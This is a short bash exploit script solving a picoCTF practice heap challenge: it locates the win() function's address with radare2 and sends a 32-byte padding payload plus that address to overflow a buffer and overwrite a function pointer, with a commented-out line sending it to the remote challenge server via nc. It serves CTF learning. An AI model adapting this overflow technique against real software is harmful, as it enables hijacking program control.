#!/bin/bash

# https://play.picoctf.org/practice/challenge/435

# Similar to heap-1 but now check_win() interprets a variable
# that can be written to through overflow (char *x) as a function

# Extract the memory address of win()
## Force r2 to print without ANSI escape coloring
address="$(r2 -e scr.color=false -q -AA -c afl ./chall 2>/dev/null \
	| grep 'sym\.win' \
	| cut -d' ' -f1)"

# buffer `x` is 32 bytes away from buffer `input_data`
payload=$(printf 'A%.0s' {1..32})
# Append win()'s memory address as escaped hexadecimal string
payload+=$(rax2 -c "$address")

# echo -e "2 $payload 4" | nc "$SERVER" "$PORT"
echo -e "2 $payload 4" | ./chall
